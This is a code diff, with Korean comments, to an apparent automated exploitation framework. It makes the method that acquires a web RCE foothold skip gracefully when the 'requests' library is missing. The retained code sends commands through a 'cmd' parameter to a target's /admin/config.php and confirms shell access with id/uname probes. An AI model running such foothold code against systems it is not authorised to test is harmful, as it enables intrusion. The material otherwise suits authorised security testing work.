@@ -1512,20 +1512,30 @@ class Orchestrator:
 
     def _acquire_session(self, report, host):
         """발판 세션 획득 + 성립 검증. --exploit-exec/--auto-poc 전용(RCE 실행 표면).
-        현재는 웹 RCE 분기만 활성 — 역쉘 수신 경로는 순서 4(실제 경로 확인) 후 재추가."""
+        현재는 웹 RCE 분기만 활성 — 역쉘 수신 경로는 순서 4(실제 경로 확인) 후 재추가.
+        웹 RCE 채널 전송부(shell_transport)는 requests 에 의존(선택 설치) — 미설치면 전체
+        실행을 크래시내지 않고 '발판 미확보'로 안전하게 건너뛴다(정직한 degrade)."""
+        if self.world is None or not (self.world.web_product and self.auto_poc):
+            return None
         from .session_verify import looks_like_shell, verify_probe_command
         from .shell_session import WebRceSession
-        from .shell_transport import web_http_fn
-
+        try:
+            from .shell_transport import web_http_fn  # requests 의존(선택)
+        except ImportError as e:
+            self.audit.event("foothold_skip", reason="requests_missing", detail=str(e))
+            report.manual_suggestions.append(
+                "# 웹 RCE 발판 채널 비활성 — requests 미설치. 활성화하려면 venv 에서 "
+                "`pip install requests`(또는 `pip install -e \".[exploit]\"`). 미설치 상태에선 "
+                "발판 미확보로 안전하게 건너뜀(실행 크래시 아님).")
+            return None
         # (1) 웹 RCE 분기: cmd 엔드포인트에 명령 실행 → id/uname 신호로 성립 검증
-        if self.world.web_product and self.auto_poc:
-            # PoC 가 성립시킨 cmd 엔드포인트(없으면 기본 config.php) — ②에서 정교화
-            url = getattr(self, "rce_url", None) or f"https://{self.world.target}/admin/config.php"
-            ws = WebRceSession(url, "cmd", method="POST", inject="body")
-            ws.attach(web_http_fn)                       # ← 실제 HTTP (표면)
-            # ★ 성립 검증: id/uname 신호가 없으면 헛발판 → 폐기(거짓 '발판 확보' 방지)
-            if looks_like_shell(ws.run(verify_probe_command())):
-                return ws
+        # PoC 가 성립시킨 cmd 엔드포인트(없으면 기본 config.php) — ②에서 정교화
+        url = getattr(self, "rce_url", None) or f"https://{self.world.target}/admin/config.php"
+        ws = WebRceSession(url, "cmd", method="POST", inject="body")
+        ws.attach(web_http_fn)                       # ← 실제 HTTP (표면)
+        # ★ 성립 검증: id/uname 신호가 없으면 헛발판 → 폐기(거짓 '발판 확보' 방지)
+        if looks_like_shell(ws.run(verify_probe_command())):
+            return ws
         return None
 
     def _prepare_revshells(self, report: OrchestrationReport) -> None:
